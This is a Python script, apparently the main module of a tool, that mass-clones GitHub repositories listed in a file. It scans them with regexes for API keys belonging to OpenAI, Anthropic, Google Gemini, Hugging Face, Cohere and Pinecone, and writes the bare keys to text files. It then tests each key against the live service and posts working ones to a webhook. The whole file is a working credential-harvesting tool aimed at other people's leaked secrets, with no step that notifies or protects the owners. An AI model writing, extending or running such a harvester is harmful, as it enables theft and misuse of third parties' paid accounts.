import os
import subprocess
import concurrent.futures
import time
from datetime import datetime
from pathlib import Path
import re
import shutil
import logging
from config import API_KEY_PATTERNS
from key_validator import KeyValidator
from webhook_notifier import send_webhook_notification

logger = logging.getLogger(__name__)

def scan_repo_for_keys(repo_path):
    """
    Scan a downloaded repository for API keys.
    Returns list of found keys with their types.
    """
    found_keys = []
    validator = KeyValidator()
    
    # File extensions to scan (code files and config files)
    code_extensions = {'.py', '.js', '.ts', '.java', '.go', '.rs', '.cpp', '.c', '.php', '.rb', '.swift', '.kt'}
    config_extensions = {'.env', '.yaml', '.yml', '.json', '.toml', '.ini', '.conf', '.config'}
    text_extensions = {'.txt', '.md', '.sh', '.bat', '.ps1'}
    
    all_extensions = code_extensions | config_extensions | text_extensions
    
    try:
        # Walk through all files in the repo
        for root, dirs, files in os.walk(repo_path):
            # Skip hidden directories and common ignore patterns
            dirs[:] = [d for d in dirs if not d.startswith('.') and d not in {'node_modules', '__pycache__', 'venv', '.git'}]
            
            for file in files:
                if file.startswith('.'):
                    continue
                    
                file_path = os.path.join(root, file)
                file_ext = Path(file_path).suffix.lower()
                
                # Only scan relevant file types
                if file_ext not in all_extensions and not file_ext == '':
                    continue
                
                try:
                    # Read file content
                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read()
                    
                    # Check each API key pattern
                    for key_type, patterns in API_KEY_PATTERNS.items():
                        for pattern in patterns:
                            matches = pattern.finditer(content)
                            for match in matches:
                                # Extract key: use capture group if present, otherwise use full match
                                if match.groups():
                                    key = match.group(1)  # Use captured group
                                else:
                                    key = match.group(0)  # Use full match
                                
                                # Clean up key: remove quotes if present
                                if key:
                                    key = key.strip('"\'')
                                
                                # Only add if it's a valid key and not already found
                                if key and key not in [k['key'] for k in found_keys]:
                                    # Additional validation: skip if it looks like a hash (sha512, sha256, etc.)
                                    if key.lower().startswith(('sha', 'md5', 'base64')):
                                        continue
                                    
                                    # Validate the key matches the expected format for this type
                                    # Skip Pinecone keys that are just UUIDs without context
                                    if key_type == 'pinecone':
                                        # Only save if it was found in a context pattern (has capture group)
                                        if not match.groups():
                                            continue  # Skip standalone UUIDs
                                    
                                    # Skip Cohere keys that don't have context
                                    if key_type == 'cohere':
                                        if not match.groups():
                                            continue  # Skip standalone 40-char strings
                                    
                                    # Validate key length based on type
                                    key_clean = key.strip('"\'').strip()
                                    valid_length = False
                                    
                                    if key_type == 'openai_standard' and len(key_clean) == 51 and key_clean.startswith('sk-'):
                                        valid_length = True
                                    elif key_type == 'openai_project' and key_clean.startswith('sk-proj-') and len(key_clean) >= 57:
                                        valid_length = True
                                    elif key_type == 'anthropic' and (key_clean.startswith('sk-ant-') or key_clean.startswith('sk-ant-api03-')):
                                        valid_length = True
                                    elif key_type == 'google_gemini' and key_clean.startswith('AIza') and len(key_clean) == 39:
                                        valid_length = True
                                    elif key_type == 'huggingface' and key_clean.startswith('hf_') and len(key_clean) == 37:
                                        valid_length = True
                                    elif key_type == 'cohere' and len(key_clean) == 40:
                                        valid_length = True
                                    elif key_type == 'pinecone' and ((len(key_clean) == 36 and '-' in key_clean) or key_clean.startswith('pc-')):
                                        valid_length = True
                                    
                                    if valid_length:
                                        found_keys.append({
                                            'key': key_clean,
                                            'type': key_type,
                                            'file': file_path,
                                            'line': content[:match.start()].count('\n') + 1
                                        })
                except Exception:
                    continue  # Skip files that can't be read
    except Exception:
        pass
    
    return found_keys

def download_and_scan_repo(url, max_retries=5):
    """
    Downloads one repository and scans it for API keys.
    Returns result message and found keys.
    Implements retry logic with exponential backoff and multiple strategies.
    """
    start_time = time.time()
    
    # Create a folder name from the URL
    folder_name = url.split("github.com/")[1].replace(".git", "").replace("/", "_")
    output_path = os.path.join("downloaded_repos", folder_name)
    
    # Check if repo already exists
    if os.path.exists(output_path):
        try:
            scan_start = time.time()
            found_keys = scan_repo_for_keys(output_path)
            scan_time = time.time() - scan_start
            
            delete_start = time.time()
            try:
                shutil.rmtree(output_path)
                delete_time = time.time() - delete_start
            except Exception:
                delete_time = time.time() - delete_start
            
            total_time = time.time() - start_time
            
            if found_keys:
                return f"⏱️  {total_time:.2f}s | 🔍 {scan_time:.2f}s | 🗑️  {delete_time:.2f}s | ✅ Scanned & deleted: {folder_name} | 🔑 {len(found_keys)} keys", found_keys
            return f"⏱️  {total_time:.2f}s | 🔍 {scan_time:.2f}s | 🗑️  {delete_time:.2f}s | ✅ Scanned & deleted: {folder_name}", []
        except Exception as e:
            logger.warning(f"Error scanning existing repo {folder_name}: {e}")
            # Continue to download fresh
    
    # Retry logic with exponential backoff
    last_error = None
    for attempt in range(max_retries):
        repo_downloaded = False
        download_time = 0
        
        try:
            # Clean up any partial download from previous attempt
            if os.path.exists(output_path):
                try:
                    shutil.rmtree(output_path)
                except Exception:
                    pass
            
            # Download the repo with increased timeout and different strategies
            download_start = time.time()
            timeout_duration = 90 + (attempt * 30)  # 90s, 120s, 150s, 180s, 210s
            
            # Try different git clone strategies based on attempt number
            git_commands = [
                # Strategy 1: Standard shallow clone (fastest)
                ["git", "clone", "--depth", "1", "--quiet", "--single-branch", url, output_path],
                # Strategy 2: Shallow clone with no single branch (more compatible)
                ["git", "clone", "--depth", "1", "--quiet", url, output_path],
                # Strategy 3: Very shallow clone
                ["git", "clone", "--depth", "1", url, output_path],
                # Strategy 4: Standard clone (no depth limit)
                ["git", "clone", "--quiet", url, output_path],
                # Strategy 5: Full clone as last resort
                ["git", "clone", url, output_path]
            ]
            
            # Select strategy based on attempt
            git_cmd = git_commands[min(attempt, len(git_commands) - 1)]
            
            try:
                result = subprocess.run(
                    git_cmd,
                    check=True,
                    timeout=timeout_duration,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )
                download_time = time.time() - download_start
                repo_downloaded = True
            except subprocess.TimeoutExpired:
                # Clean up timeout
                if os.path.exists(output_path):
                    try:
                        shutil.rmtree(output_path)
                    except Exception:
                        pass
                last_error = f"Timeout after {timeout_duration}s"
                if attempt < max_retries - 1:
                    wait_time = min(2 ** attempt, 10)  # Exponential backoff, max 10s
                    logger.debug(f"⏳ Retry {attempt + 1}/{max_retries} for {folder_name} after {wait_time}s (timeout)")
                    time.sleep(wait_time)
                    continue
                else:
                    total_time = time.time() - start_time
                    return f"⏱️  {total_time:.2f}s | ❌ Timeout after {max_retries} attempts: {url}", []
            except subprocess.CalledProcessError as e:
                # Check if it's a non-retryable error (repo not found, 404, resource not available)
                error_output = e.stderr.decode('utf-8', errors='ignore') if e.stderr else ""
                stdout_output = e.stdout.decode('utf-8', errors='ignore') if e.stdout else ""
                full_error = (error_output + " " + stdout_output).lower()
                
                # Only skip for these specific non-retryable errors (repo doesn't exist, 404, etc.)
                non_retryable_patterns = [
                    'not found',
                    '404',
                    'does not exist',
                    'repository not found',
                    'resource not available',
                    'ressource not available',  # French typo variant
                    'resource unavailable',
                    'no such repository',
                    'repository does not exist'
                ]
                
                # Check if this is a non-retryable error
                is_non_retryable = any(pattern in full_error for pattern in non_retryable_patterns)
                
                if is_non_retryable:
                    # Skip immediately - no need to retry if repo doesn't exist
                    total_time = time.time() - start_time
                    return f"⏱️  {total_time:.2f}s | ⚠️  Skipped (repo not found/404): {url}", []
                
                # All other errors are retryable (timeout, network issues, etc.)
                last_error = f"Git error: {error_output[:80]}"
                if attempt < max_retries - 1:
                    wait_time = min(2 ** attempt, 15)  # Exponential backoff, max 15s
                    logger.info(f"⏳ Retry {attempt + 1}/{max_retries} for {folder_name} after {wait_time}s (retryable error: {error_output[:50]})")
                    time.sleep(wait_time)
                    continue
                else:
                    # Last attempt failed - will be retried in retry queue
                    total_time = time.time() - start_time
                    return f"⏱️  {total_time:.2f}s | ❌ Failed after {max_retries} attempts: {url} ({error_output[:50]})", []
            
            # Successfully downloaded, now scan
            scan_start = time.time()
            found_keys = scan_repo_for_keys(output_path)
            scan_time = time.time() - scan_start
            
            # Delete repo immediately after scanning
            delete_start = time.time()
            try:
                shutil.rmtree(output_path)
                delete_time = time.time() - delete_start
            except Exception as e:
                delete_time = time.time() - delete_start
                logger.debug(f"Warning: Could not delete {output_path}: {e}")
            
            total_time = time.time() - start_time
            
            if found_keys:
                return f"⏱️  {total_time:.2f}s | ⬇️  {download_time:.2f}s | 🔍 {scan_time:.2f}s | 🗑️  {delete_time:.2f}s | ✅ {folder_name} | 🔑 {len(found_keys)} keys", found_keys
            return f"⏱️  {total_time:.2f}s | ⬇️  {download_time:.2f}s | 🔍 {scan_time:.2f}s | 🗑️  {delete_time:.2f}s | ✅ {folder_name}", []
            
        except Exception as e:
            last_error = str(e)
            # Clean up on error
            if os.path.exists(output_path):
                try:
                    shutil.rmtree(output_path)
                except Exception:
                    pass
            
            if attempt < max_retries - 1:
                wait_time = min(2 ** attempt, 10)
                logger.debug(f"⏳ Retry {attempt + 1}/{max_retries} for {folder_name} after {wait_time}s (error: {str(e)[:30]})")
                time.sleep(wait_time)
                continue
    
    # All retries failed
    total_time = time.time() - start_time
    error_msg = last_error[:50] if last_error else "Unknown error"
    return f"⏱️  {total_time:.2f}s | ❌ Failed after {max_retries} attempts: {url} ({error_msg})", []

def save_key(key_data, key_type, is_working=False):
    """
    Save found API key to file immediately (only the key, no metadata).
    """
    filename = "working_api_keys.txt" if is_working else "found_api_keys.txt"
    key = key_data['key']
    
    with open(filename, "a", encoding="utf-8") as f:
        f.write(f"{key}\n")
        f.flush()
    
    # Track key in current run if app is available
    try:
        import key_tracker
        key_tracker.track_key(key)
    except:
        pass  # Silently fail if tracking not available

def bulk_downloader():
    """
    Main function: Download repos and scan for API keys.
    """
    # Create output directory
    if not os.path.exists("downloaded_repos"):
        os.makedirs("downloaded_repos")
    
    # Initialize key files if they don't exist
    if not os.path.exists("found_api_keys.txt"):
        with open("found_api_keys.txt", "w") as f:
            pass  # Create empty file
    if not os.path.exists("working_api_keys.txt"):
        with open("working_api_keys.txt", "w") as f:
            pass  # Create empty file
    
    # Initialize key validator
    validator = KeyValidator()
    
    # Initialize key files (just create empty files, no headers)
    # Keys will be written one per line, no metadata
    
    # Read repo URLs
    if not os.path.exists("repo_list.txt"):
        logger.error("❌ Error: repo_list.txt not found. Run big.py first!")
        return
    
    with open("repo_list.txt", "r") as f:
        urls = [line.strip() for line in f if line.strip()]
    
    total_repos = len(urls)
    logger.info(f"🚀 Starting download and scan of {total_repos} repositories...")
    logger.info(f"📊 Using 30 parallel workers for maximum speed")
    logger.info(f"🗑️  Repositories will be deleted after scanning to save disk space")
    logger.info(f"⏱️  Timing: Total | Download | Scan | Delete | Status")
    logger.info(f"{'='*80}")
    
    start_time = time.time()
    completed = 0
    total_keys_found = 0
    total_working_keys = 0
    
    # Track failed repos for retry
    failed_repos = []
    retry_queue = []
    
    # Use 30 workers for faster processing
    with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
        # Submit all tasks
        future_to_url = {executor.submit(download_and_scan_repo, url): url for url in urls}
        
        # Process results as they complete
        for future in concurrent.futures.as_completed(future_to_url):
            completed += 1
            url = future_to_url[future]
            
            try:
                result_msg, found_keys = future.result()
                
                # Check if this was a failure that should be retried
                if "❌ Failed" in result_msg or "❌ Timeout" in result_msg:
                    # Only retry if it's not a "Skipped" (non-retryable) error
                    # Skipped errors are repo not found/404 - don't retry those
                    if "Skipped" not in result_msg:
                        failed_repos.append(url)
                        retry_queue.append(url)
                        logger.warning(f"⚠️  {result_msg} - Will retry in retry queue")
                    else:
                        logger.info(result_msg)  # Log skipped repos but don't retry
                else:
                    logger.info(result_msg)
                
                # Process found keys
                for key_data in found_keys:
                    total_keys_found += 1
                    save_key(key_data, key_data['type'], is_working=False)
                    logger.info(f"🔑 Found {key_data['type']} key: {key_data['key'][:30]}...")
                    
                    # Test if key is working
                    try:
                        is_valid, message = validator.validate_key(key_data['type'], key_data['key'])
                        if is_valid:
                            total_working_keys += 1
                            save_key(key_data, key_data['type'], is_working=True)
                            logger.info(f"✅ WORKING {key_data['type']} key: {key_data['key'][:30]}... ({message})")
                            # Send webhook notification
                            send_webhook_notification(key_data['key'], key_data['type'], message)
                        else:
                            logger.debug(f"❌ Invalid {key_data['type']} key: {message}")
                    except Exception as e:
                        logger.warning(f"Error testing key: {e}")
                
                # Progress update every 10 repos
                if completed % 10 == 0:
                    elapsed = time.time() - start_time
                    rate = completed / elapsed if elapsed > 0 else 0
                    remaining = (total_repos - completed) / rate if rate > 0 else 0
                    logger.info(f"\n📈 Progress: {completed}/{total_repos} ({completed*100//total_repos}%) | "
                          f"Rate: {rate:.1f} repos/sec | "
                          f"ETA: {remaining:.0f}s | "
                          f"Keys: {total_keys_found} found, {total_working_keys} working | "
                          f"Failed: {len(failed_repos)}\n")
                
            except Exception as e:
                logger.error(f"❌ Exception processing {url}: {e}")
                failed_repos.append(url)
                retry_queue.append(url)
    
    # Retry failed repos with more attempts and extended timeouts
    if retry_queue:
        logger.info(f"\n🔄 Retrying {len(retry_queue)} failed repositories with extended timeout and more attempts...")
        retry_start = time.time()
        retry_completed = 0
        retry_successful = 0
        
        # Remove duplicates while preserving order
        retry_queue = list(dict.fromkeys(retry_queue))
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=15) as executor:  # More workers for retries
            future_to_url = {executor.submit(download_and_scan_repo, url, max_retries=7): url for url in retry_queue}
            
            for future in concurrent.futures.as_completed(future_to_url):
                retry_completed += 1
                url = future_to_url[future]
                
                try:
                    result_msg, found_keys = future.result()
                    
                    # Check if retry was successful
                    if "✅" in result_msg and "❌" not in result_msg:
                        retry_successful += 1
                        logger.info(f"🔄 ✅ Retry SUCCESS: {result_msg}")
                    else:
                        logger.warning(f"🔄 ⚠️  Retry still failed: {result_msg}")
                    
                    # Process found keys from retry
                    for key_data in found_keys:
                        total_keys_found += 1
                        save_key(key_data, key_data['type'], is_working=False)
                        logger.info(f"🔑 Found {key_data['type']} key: {key_data['key'][:30]}...")
                        
                        try:
                            is_valid, message = validator.validate_key(key_data['type'], key_data['key'])
                            if is_valid:
                                total_working_keys += 1
                                save_key(key_data, key_data['type'], is_working=True)
                                logger.info(f"✅ WORKING {key_data['type']} key: {key_data['key'][:30]}... ({message})")
                                send_webhook_notification(key_data['key'], key_data['type'], message)
                        except Exception as e:
                            logger.warning(f"Error testing key: {e}")
                            
                except Exception as e:
                    logger.error(f"❌ Retry exception for {url}: {e}")
        
        retry_time = time.time() - retry_start
        logger.info(f"\n{'='*80}")
        logger.info(f"🔄 Retry Summary: {retry_successful}/{retry_completed} successful out of {len(retry_queue)} repos")
        logger.info(f"⏱️  Retry time: {retry_time:.1f}s")
        logger.info(f"{'='*80}\n")
    
    # Final summary
    total_time = time.time() - start_time
    logger.info(f"\n{'='*80}")
    logger.info(f"✅ Completed: {completed}/{total_repos} repositories")
    logger.info(f"⏱️  Total time: {total_time:.1f}s ({total_time/60:.1f} minutes)")
    logger.info(f"📊 Average rate: {completed/total_time:.2f} repos/sec")
    logger.info(f"🔑 Keys found: {total_keys_found} total, {total_working_keys} working")
    print(f"💾 Results saved to: found_api_keys.txt and working_api_keys.txt")

if __name__ == "__main__":
    bulk_downloader()
